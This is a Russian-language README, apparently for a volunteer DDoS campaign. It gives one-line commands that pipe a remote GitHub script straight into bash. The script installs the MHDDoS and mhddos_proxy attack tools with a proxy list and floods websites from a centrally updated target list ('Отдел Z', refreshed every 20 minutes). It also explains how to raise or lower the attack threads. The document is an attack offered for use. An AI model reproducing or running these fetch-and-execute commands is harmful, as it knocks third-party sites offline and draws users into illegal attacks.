# Запустить скрипт

curl -s https://raw.githubusercontent.com/gruzilkinnn/dev_bash/master/runner.sh | bash
Автоматически устанавливает git python3, pip, mhddos_proxy, MHDDoS, расширенный список proxy и все зависимости.

Работает с базой сайтов Отдел Z.

База целей обновляется каждые 20 минут.

Во время запуска всегда проверяет и загружает обновления mhddos_proxy и MHDDoS.

Рекомендуется использовать на Ubuntu 20.04. Но должно работать на всех Ubuntu и Debian производных, а также в WSL2.

Для остановки скрипта несколько раз нажмите CTRL + C, или закройте окно с терминалом.

❕ Изменение интенсивности
Если скрипт очень замедляет ПК, или наоборот Вы имеете неиспользованные ресурсы, можно снизить, или наоборот повысить интенсивность работы скрипта. Для этого надо управлять параметром threads. По умолчанию threads = 1000.

Чтобы снизить нагрузку на систему, попробуйте использовать threads = 500

curl -s https://raw.githubusercontent.com/gruzilkinnn/dev_bash/master/runner.sh | bash -s -- 500
Чтобы загрузить систему больше, попробуйте использовать threads = 2000

curl -s https://raw.githubusercontent.com/gruzilkinnn/dev_bash/master/runner.sh | bash -s -- 2000
